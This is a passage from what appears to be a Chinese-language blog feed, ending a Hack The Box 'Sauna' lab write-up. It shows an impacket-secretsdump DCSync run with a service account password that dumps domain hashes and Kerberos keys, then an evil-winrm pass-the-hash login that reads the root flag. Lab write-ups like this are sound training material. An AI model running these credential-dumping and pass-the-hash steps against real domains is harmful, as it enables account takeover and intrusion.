+</span></span><span style="display:flex;"><span>INFO: Compressing output into 20260421093238_bloodhound.zip
+</span></span><span style="display:flex;"><span>                                                                                                                               
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah 20260421093238_bloodhound.zip 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2766434</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 139K Apr <span style="color:#ae81ff">21</span> 09:33 20260421093238_bloodhound.zip
+</span></span></code></pre></div><p>浏览了一圈未发现有用的信息。</p>
+<p>执行 <code>secretsdump</code> 暴露出 <code>administrator</code> 的 hash。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>                                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump -just-dc egotistical-bank.local/svc_loanmgr:<span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>@10.129.22.120
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+</span></span><span style="display:flex;"><span>SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:107983a00ee44777ecd57b33b6caed05:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:fb8f321c64cea87f
+</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:des-cbc-md5:1c73b99168d3f8c7
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:des-cbc-md5:b50e02ab0d85f76b
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+</span></span><span style="display:flex;"><span>SAUNA$:aes256-cts-hmac-sha1-96:9494462d4080b6a0abcef757f627c17b2aa14822ea0ef7281ed1a46119bfc950
+</span></span><span style="display:flex;"><span>SAUNA$:aes128-cts-hmac-sha1-96:ce8abe15851e50bcfa804121824bae56
+</span></span><span style="display:flex;"><span>SAUNA$:des-cbc-md5:89237a5dfed60416
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</span></span></code></pre></div><p>登陆拿到权限 root flag。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.22.120 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>5183e6faa81a508920196120306ef1c2
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>HTB-Return Writeup</title>
